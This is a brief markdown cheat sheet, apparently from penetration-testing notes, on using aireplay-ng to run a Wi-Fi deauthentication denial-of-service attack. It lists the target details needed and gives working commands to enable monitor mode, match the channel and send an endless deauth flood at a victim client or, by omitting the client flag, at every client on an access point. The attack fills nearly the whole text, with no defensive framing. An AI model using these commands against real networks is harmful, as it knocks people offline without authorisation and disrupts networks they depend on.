# Aireplay-ng

### Aireplay-ng DOS

#### Information required for DOS

* The information that is needed is the MAC address of the victim, the BSSID of the access point, and the channel number.

```
# Place interface into monitor mode
sudo airmon-ng start wlan0
# Match the cards channel to the victim APs channel
sudo iwconfig wlan0mon channel 11
# Start attack
sudo aireplay-ng --deauth 0 -e "My Wifi" -c <victim MAC> --ignore-negative-one wlan0mon
```

* if `-c` is not specified aireplay-ng will send the deauth storm to broadcast, knocking all clients offline
* `--ignore-negative-one` is to avoid errors when aireplay-ng cannot identify the channel youre wireless card is on
* `-e` is the SSID of the target
